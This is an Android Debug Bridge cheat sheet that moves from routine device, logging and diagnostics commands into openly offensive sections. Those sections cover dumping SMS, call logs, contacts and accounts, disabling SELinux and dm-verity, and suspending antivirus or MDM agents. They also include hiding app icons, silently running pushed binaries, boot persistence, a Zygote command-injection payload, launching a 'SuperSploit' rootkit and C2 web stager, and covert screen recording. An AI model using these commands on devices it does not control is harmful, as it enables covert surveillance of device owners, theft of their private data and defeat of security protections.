# 📱 The Ultimate ADB Technical Cheat Sheet (2026 Edition)

This comprehensive guide covers standard Android Debug Bridge (ADB) operations, advanced exploitation, forensic techniques, and deep system diagnostics.

---

## 🛠️ 1. Core Connection & Management
| Command | Description |
| :--- | :--- |
| `adb devices -l` | List connected devices with detailed model/product info. |
| `adb connect [IP]:[PORT]` | Connect to a device over Wi-Fi (Default port: 5555). |
| `adb disconnect` | Disconnect from all wireless devices. |
| `adb kill-server` | Terminate the ADB background process. |
| `adb start-server` | Manually start the ADB background process. |
| `adb -s [SERIAL] [CMD]` | Execute command on a specific device. |
| `adb wait-for-device` | Block execution until a device is connected. |
| `adb pair [IP]:[PORT] [CODE]` | Pair with an Android 11+ device using Wireless Debugging. |
| `adb tcpip 5555` | Restart the `adbd` daemon listening on TCP port 5555 (requires USB first). |
| `adb usb` | Restart the `adbd` daemon listening on USB. |
| `adb reboot` | Reboot the device normally. |
| `adb reboot bootloader` | Reboot into the bootloader / fastboot mode. |
| `adb reboot recovery` | Reboot into recovery mode. |
| `adb reboot edl` | Reboot into Qualcomm Emergency Download Mode (if supported). |

---

## 📂 2. File & Application Operations
| Command | Description |
| :--- | :--- |
| `adb push [LOCAL] [REMOTE]` | Copy file to device (e.g., `/data/local/tmp/`). |
| `adb pull [REMOTE] [LOCAL]` | Copy file from device to your machine. |
| `adb install [-r] [-g] [APK]` | Install APK (`-r` reinstall, `-g` grant all permissions). |
| `adb uninstall [PKG_NAME]` | Remove an application. |
| `adb install -t [APK]` | Install a "Test Only" APK. |
| `adb shell pm grant [PKG] [PERM]` | Grant a specific permission (e.g., `android.permission.READ_SMS`). |
| `adb shell pm revoke [PKG] [PERM]` | Revoke a specific permission. |
| `adb shell pm list packages -f` | List all installed packages and their file paths. |
| `adb shell pm list packages -3` | List only third-party (user-installed) packages. |
| `adb shell pm path [PKG_NAME]` | Find the path to a specific APK. |
| `adb shell pm clear [PKG_NAME]` | Wipe all data associated with an app. |
| `adb backup -apk -shared -all -f backup.ab` | Create a full system backup (Legacy Android). |
| `adb restore backup.ab` | Restore a system backup. |

---

## 🔍 3. Advanced Reconnaissance (Shell Commands)
| Command | Description |
| :--- | :--- |
| `adb shell getprop` | Dump all system properties (Model, SDK, Kernel, etc.). |
| `adb shell uname -a` | Show kernel version and architecture (e.g., `aarch64`). |
| `adb shell dumpsys battery` | Check battery status and level. |
| `adb shell dumpsys activity top` | Identify the currently active (foreground) application. |
| `adb shell pm list users` | List all user profiles on the device. |
| `adb shell netstat -antp` | List active network connections and listening ports. |
| `adb shell ip addr show` | View local IP addresses and network interfaces. |
| `adb shell dumpsys semprivilege` | (Samsung) Dump Samsung-specific privilege settings. |
| `adb shell cat /proc/cpuinfo` | Detailed CPU architecture and core information. |
| `adb shell cat /proc/cmdline` | Bootloader command line arguments passed to the kernel. |
| `adb shell cat /proc/mounts` | View all active filesystem mount points and their permissions (e.g., `rw`). |
| `adb shell df -h` | View disk usage and partition sizes. |
| `adb shell getprop ro.build.version.security_patch` | Extract the specific Android Security Patch Level (SPL). |

---

## 🕵️ 4. Data Exfiltration (Content Providers)
*Requires appropriate permissions or root access.*
| Command | Description |
| :--- | :--- |
| `adb shell content query --uri content://sms/inbox` | Dump all received SMS messages. |
| `adb shell content query --uri content://call_log/calls` | Dump full call history. |
| `adb shell content query --uri content://contacts/phones` | Dump contact list with phone numbers. |
| `adb shell content query --uri content://settings/global` | Dump global system settings. |
| `adb shell content query --uri content://com.android.calendar/events` | Dump all calendar events. |
| `adb shell content query --uri content://settings/secure` | Dump secure system settings (e.g., `android_id`). |
| `adb shell screencap -p /sdcard/screen.png` | Take a silent screenshot and save it to the SD card. |
| `adb shell screenrecord --time-limit 10 /sdcard/demo.mp4` | Record the device screen (Android 4.4+). |

---

## 🚀 5. Exploitation & Advanced Interaction
| Command | Description |
| :--- | :--- |
| `adb root` | Restart `adbd` with root permissions (Production builds usually fail). |
| `adb shell am start -n [PKG]/[ACT]` | Force start a specific Activity (e.g., Settings). |
| `adb shell am force-stop [PKG]` | Kill an application process immediately. |
| `adb shell input tap [X] [Y]` | Simulate a screen tap at coordinates. |
| `adb shell input swipe [X1] [Y1] [X2] [Y2] [MS]` | Simulate a screen swipe (e.g., `500 1500 500 500 200` to swipe up). |
| `adb shell input text "[STRING]"` | Simulate keyboard input. |
| `adb shell input keyevent [CODE]` | Send physical keyevent. **Codes:** `3` (HOME), `4` (BACK), `26` (POWER), `66` (ENTER), `224` (WAKEUP), `24` (VOL UP), `25` (VOL DOWN). |
| `adb shell settings put global [KEY] [VAL]` | Modify system-wide settings. |
| `adb forward tcp:[LOCAL] tcp:[REMOTE]` | Forward a local port to a device port. |
| `adb reverse tcp:[REMOTE] tcp:[LOCAL]` | Reverse forward (C2 callback strategy). |
| `adb shell am broadcast -a [ACTION]` | Send a broadcast intent (e.g., `android.intent.action.BOOT_COMPLETED`). |
| `adb shell am startservice -n [PKG]/[SVC]` | Start a background service manually. |
| `adb shell svc wifi enable/disable` | Toggle Wi-Fi state from the shell. |
| `adb shell svc data enable/disable` | Toggle Cellular Data state from the shell. |

---

## 📋 6. Logcat: System Logging & Debugging
| Command | Description |
| :--- | :--- |
| `adb logcat` | Start streaming real-time logs (Ctrl+C to stop). |
| `adb logcat -c` | Clear (flush) all logs on the device. |
| `adb logcat -d > log.txt` | Dump current logs to a local file and exit. |
| `adb logcat -v threadtime` | Shows Date, Time, PID, TID, Priority, and Tag. |
| `adb logcat *:E` | Filter to only show **Error** priority and above. |
| `adb logcat --pid=[PID]` | Filter logs for a specific Process ID. |
| `adb shell dmesg` | View kernel-level logs (useful for LPE/Crash analysis). |
| `adb logcat -b all` | View all log buffers simultaneously (radio, events, main, system, crash). |
| `adb logcat -e "[REGEX]"` | Filter logs dynamically using a regular expression. |
| `adb logcat --pid=$(adb shell pidof [PKG])` | Stream logs dynamically linked to a specific package name. |

**Priority Levels:** `V` (Verbose), `D` (Debug), `I` (Info), `W` (Warning), `E` (Error), `F` (Fatal), `S` (Silent)

---

## 🏗️ 7. Dumpsys: System Service Diagnostics
| Command | Description |
| :--- | :--- |
| `adb shell dumpsys -l` | List all available system services to query. |
| `adb shell dumpsys activity top` | Show detailed state of the foreground activity. |
| `adb shell dumpsys package [PKG]` | View permissions, versions, and **DEBUGGABLE** flags. |
| `adb shell dumpsys meminfo [PKG]` | Detailed RAM usage breakdown for an app. |
| `adb shell dumpsys battery` | View health, voltage, and temperature. |
| `adb shell dumpsys wifi` | Dump Wi-Fi state (SSID, Signal, nearby APs). |
| `adb shell dumpsys procstats` | Process statistics and history. |
| `adb shell dumpsys window displays` | Display screen resolution, DPI, and refresh rate. |
| `adb shell dumpsys account` | Dump all configured accounts (Google, Samsung, Exchange, etc.). |
| `adb shell dumpsys alarm` | View scheduled background tasks and wakelocks. |

---

## 🌐 8. Network Operations & Pivoting
| Command | Description |
| :--- | :--- |
| `adb shell ip neigh` | View the ARP table to map the local network from the device's perspective. |
| `adb shell ss -tulnp` | View active sockets and listening processes (modern alternative to `netstat`). |
| `adb shell iptables -L -n` | View local firewall rules (Requires Root). |
| `adb shell ping -c 4 [IP]` | Test network connectivity from the device. |

---

## 🔓 9. Security & Hardening Bypasses
| Command | Description |
| :--- | :--- |
| `adb shell settings put secure install_non_market_apps 1` | Silently enable "Install from Unknown Sources". |
| `adb shell settings put global development_settings_enabled 1` | Silently enable Developer Options. |
| `adb shell setenforce 0` | Temporarily disable SELinux (Set to Permissive) (Requires Root). |
| `adb disable-verity` | Disable dm-verity to allow persistent modifications to the `/system` partition (Requires ADB Root & Reboot). |
| `adb shell pm suspend [PKG]` | Suspend an app (useful for disabling AV/MDM agents temporarily without root uninstall). |

---

## ⚙️ 10. Fastboot & Bootloader (Advanced Hardware)
*These commands require the device to be rebooted into Bootloader Mode (`adb reboot bootloader`).*
| Command | Description |
| :--- | :--- |
| `fastboot devices` | Verify fastboot communication with the device. |
| `fastboot getvar all` | Dump highly sensitive hardware parameters (Bootloader version, baseband, unlock state). |
| `fastboot oem unlock` / `flashing unlock` | Attempt to unlock the bootloader (WIPES DATA). |
| `fastboot boot [IMG]` | Temporarily boot a custom kernel/recovery image without flashing it to disk. |
| `fastboot flash [PARTITION] [IMG]` | Flash an image directly to a partition (e.g., `boot`, `recovery`, `system`). |

---

## 🧪 11. SuperSploit Specialized Research (June 2026)

**Master Key Bypass (CVE-2026-0073):**
*   **Vulnerability:** Logic error in `adbd_tls_verify_cert` allowing zero-click RCE.
*   **Target:** Adjacent attackers can impersonate authorized devices over Wireless ADB.

**Zygote Injection (CVE-2024-31317):**
*   **Command:** `adb shell settings put global hidden_api_blacklist_exemptions "L;\\n[CMD]"`
*   **Mechanism:** Injects commands into Zygote via a newline in global settings.

**Samsung AT Command Fuzzing:**
*   **Interface:** `/dev/ttyACM0`
*   **Commands:** `AT+FACMODE=1`, `AT+KNOXSTEP=1`, `AT+ACTIBLEAD`.

**Automated LPE Chains:**
*   SuperSploit bridges these interfaces using `adb_deployment_scripts/deploy_lpe.sh` to stage and trigger chained binary exploits (e.g., BadBinder -> eBPF) silently from the attacker host.

---

## 🛡️ 12. Stealth & Persistence
- **Hide App Icon:** `adb shell pm disable [PKG_NAME]/[LAUNCHER_ACTIVITY]` (Hides from App Drawer).
- **Silent Deployment:** `adb push [ELF] /data/local/tmp && adb shell chmod +x [ELF] && adb shell ./[ELF] &` 
  - *(Note: `/data/local/tmp` is often the only partition mounted with `exec` permissions for the shell user on locked devices).*
- **Wakelocks:** Prevent sleep during exfiltration using `dumpsys power`.
- **Magisk Persistence:** Drop scripts into `/data/adb/service.d/` for automatic execution on boot before Android fully initializes.

---

## ⚙️ 13. Operational Workflow Summary
1.  **Monitor Crashes:** `adb logcat -v threadtime | grep -i "FATAL EXCEPTION"`
2.  **Verify LPE Surface:** `adb shell dumpsys package [PKG] | grep -E "flags|userId"`
3.  **Identify Active App:** `adb shell dumpsys activity top | grep "ACTIVITY"`
4.  **Extract Sandbox Path:** `adb shell dumpsys package [PKG] | grep "dataDir"`

---

## 🎭 14. Activity Manager (AM) & Intent Routing
*The `am` (Activity Manager) tool is critical for triggering SuperSploit payloads, simulating user actions, and interacting with Android's IPC components without a GUI.*
- **`adb shell am start -n org.supersploit.stub/.RootManagerActivity`**: Launch a specific activity directly (e.g., triggering the SuperSploit rootkit payload).
- **`adb shell am startservice -n org.supersploit.stub/.PayloadService`**: Start a background service without bringing an app to the foreground.
- **`adb shell am broadcast -a android.intent.action.BOOT_COMPLETED`**: Simulate a device boot to trigger persistence mechanisms and receivers.
- **`adb shell am start -a android.intent.action.VIEW -d "https://[C2_URL]"`**: Force the default browser to open a specific URL (useful for Web Stager delivery).
- **`adb shell am start -a android.intent.action.CALL -d "tel:15551234567"`**: Force the device to initiate a phone call.
- **`adb shell am start -a android.intent.action.SENDTO -d sms:15551234567 --es sms_body "Your payload here"`**: Open the default SMS app pre-filled with a target number and message body.
- **`adb shell am force-stop [PKG_NAME]`**: Force close an application, killing all its background processes and services.
- **`adb shell am instrument -w [PKG]/[TEST_RUNNER]`**: Run instrumentation tests (useful for dynamic analysis and DAST).
- **`adb shell am kill [PKG_NAME]`**: Kill all processes associated with a package (safe kill, respects lifecycle).
- **`adb shell am start -a android.settings.SETTINGS`**: Open the main Settings application.

---

## 📸 15. Stealth Media & Screen Exfiltration
*Techniques for capturing live screen data and recording device usage for operational intelligence.*
- **`adb shell screencap -p /data/local/tmp/screen.png`**: Capture a silent, high-resolution PNG screenshot and save it to a writable, hidden directory.
- **`adb exec-out screencap -p > local_screen.png`**: Capture a screenshot and pipe it *directly* to the attacker's local machine (bypasses saving to the device disk).
- **`adb shell screenrecord --time-limit 180 --size 1280x720 /data/local/tmp/rec.mp4`**: Record the device screen invisibly for 3 minutes (180s) at 720p.
- **`adb shell screenrecord --bit-rate 8000000 /sdcard/rec.mp4`**: Record the screen at a high bit-rate (8Mbps) for maximum quality.
- **`adb shell screenrecord --bugreport /sdcard/rec.mp4`**: Record the screen and include a bug report track with video frames.
- **`adb shell input keyevent 27`**: Trigger the hardware Camera button to silently snap a photo (if the app is open).
- **`adb shell am start -a android.media.action.IMAGE_CAPTURE`**: Force open the camera application in image capture mode.
- **`adb shell am start -a android.media.action.VIDEO_CAPTURE`**: Force open the camera application in video capture mode.
- **`adb shell content query --uri content://media/external/images/media`**: Enumerate all images stored in the device's MediaStore.
